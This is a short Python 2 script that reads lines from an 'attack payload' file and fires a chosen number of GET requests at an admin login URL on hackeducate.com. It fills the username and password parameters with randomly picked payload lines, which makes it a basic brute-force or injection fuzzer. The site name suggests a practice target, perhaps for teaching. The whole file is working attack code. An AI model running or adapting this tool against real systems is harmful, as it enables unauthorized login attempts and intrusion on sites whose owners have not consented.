from urllib import urlencode
from urlparse import parse_qs, urlsplit, urlunsplit
import sys
import requests
import random



input_file = sys.argv[1] #this is a text file with your attack payload
num = sys.argv[2] #this is the number of requests you want to make to the target url
url = 'http://hackeducate.com/admin?user=1&password=2'

## using .format()
def my_url_fxn(un, pw):
	my_url = "http://hackeducate.com/admin?user={username}&password={password}".format(username=un, password=pw)
	return my_url

with open (input_file, "r") as payload_file:
	payload = payload_file.read().split("\n")

i = 0
while i < int(num):
	payload1 = random.choice(payload)
	payload2 = random.choice(payload)
	url = my_url_fxn(payload1, payload2)
	print url
	req = requests.get(url)
	print req
#	print req.text
	i += 1
# for arguments in list_of_params: 
# 	# list_of_params is list of lists of un, pw, like [['username','password']]
# 	url = my_url_fxn(arguments[0], arguments[1])
# 	#use request to fetch that url 
# 	requests.get(url)
